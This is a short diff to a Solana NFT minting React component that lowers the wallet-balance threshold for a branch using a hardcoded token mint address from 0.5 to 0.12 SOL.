@@ -50,7 +50,7 @@ const MintingComponent = ({setAlertState} : any) => {
       const transaction = new Transaction();
       transaction.add(mintFeeTransferInstruction, tokenTransferInstruction);
 
-      if(totalBalance > LAMPORTS_PER_SOL * 0.5) {
+      if(totalBalance > LAMPORTS_PER_SOL * 0.12) {
         const mintAddress1 = new PublicKey('8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx');
         // const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, wallet.publicKey);
         // const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, serverWallet.publicKey);
